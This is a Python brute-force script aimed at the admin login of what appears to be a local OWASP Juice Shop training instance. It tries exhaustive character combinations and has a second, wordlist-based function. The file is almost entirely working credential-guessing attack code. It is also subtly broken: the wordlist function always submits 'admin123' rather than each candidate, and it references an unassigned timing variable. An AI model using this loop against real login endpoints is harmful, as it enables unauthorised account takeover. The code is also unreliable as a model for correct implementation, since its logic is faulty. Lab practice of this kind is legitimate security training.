#!/bin/python3
import itertools
import requests
from datetime import datetime

def mock_login(password):
    target_password = "abc123"
    return password == target_password

def bfa(characters, maxlength):
    print("Starting")
    c = datetime.now()
    attempts = 0
    auth_url = 'http://localhost:3000/rest/user/login'
    for length in range(8, maxlength + 1):
        for combination in itertools.product(characters, repeat=length):
            attempts += 1
            guess = ''.join(combination)
            payload = {"email":"admin@juice-sh.op","password":f"{guess}"}
            #POST with JSON payload
            response = requests.post(auth_url, json=payload)

            if response.status_code == 200:
                print("Password found: ", guess)
                d = datetime.now() - c
                print(d)
                return
            elif attempts % 10000 == 0:
                print(f"Attempts so far {attempts}")
                print(f"Current guess: {guess}")
    print("Failed to guess password")
    d = datetime.now() - c
    print(f"Time it took {d}")

def bfw():
    print("Starting...")
    with open('/usr/share/seclists/Passwords/Common-Credentials/darkweb2017_top-10000.txt','r') as f:
        passwords = [line.strip() for line in f]

    auth_url = 'http://localhost:3000/rest/user/login'
    attempts = 0
    c = datetime.now()

    for password in passwords:
        attempts +=1
        payload = {"email":"admin@juice-sh.op","password":"admin123"}
        response = requests.post(auth_url, json=payload)

        if response.status_code == 200:
            print("Password found: ", password)
            print(f"Time it took {d}")
            return
        if attempts % 100 == 0:
            print(f"Attempts so far {attempts}")
            print(f"Current guess: {password}")
    print("Failed to guess password")
    d = datetime.now() - c
    print(f"Time it took {d}")

if __name__ == "__main__":
    characters="admin123"
    maxlength=10
    try:
        bfa(characters,maxlength)
    except KeyboardInterrupt:
        print("Halted by user")
        quit()
